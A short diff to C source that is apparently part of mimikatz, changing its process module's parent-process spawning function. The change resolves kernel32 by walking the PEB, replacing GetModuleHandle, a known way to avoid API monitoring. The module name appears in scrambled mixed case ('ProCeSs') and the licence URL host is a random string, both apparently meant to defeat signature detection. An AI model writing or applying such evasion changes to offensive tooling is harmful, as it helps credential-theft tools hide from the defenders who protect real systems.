@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kuhl_m_ProCeSs.h"
+#include "..\mimilib\api_resolver.h"
 
 const KUHL_M_C kuhl_m_c_ProCeSs[] = {
 	{kuhl_m_ProCeSs_list,		L"list",		L"List ProCeSs"},
@@ -291,6 +292,9 @@ NTSTATUS kuhl_m_ProCeSs_runParent(int argc, wchar_t * argv[])
 
 	RtlZeroMemory(&si, sizeof(STARTUPINFOEX));
 	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
+
 #pragma warning(push)
 #pragma warning(disable:4996)
 	kull_m_string_args_byName(argc, argv, L"run", &szRun, _wpgmptr);
@@ -307,7 +311,8 @@ NTSTATUS kuhl_m_ProCeSs_runParent(int argc, wchar_t * argv[])
 	if(kull_m_string_copy(&szDupRun, szRun))
 	{
 		kprintf(L"Run : %s\nPPID: %u\n", szDupRun, pid);
-		if(hModule = GetModuleHandle(L"kernel32.dll"))
+		//if(hModule = GetModuleHandle(L"kernel32.dll"))
+		if (hModule = hKernel32Base)
 		{
 			pInit = (PINITIALIZEPROCTHREADATTRIBUTELIST) GetProcAddress(hModule, "InitializeProcThreadAttributeList"); // because you know, xp/2003...
 			pUpdate = (PUPDATEPROCTHREADATTRIBUTE) GetProcAddress(hModule, "UpdateProcThreadAttribute");
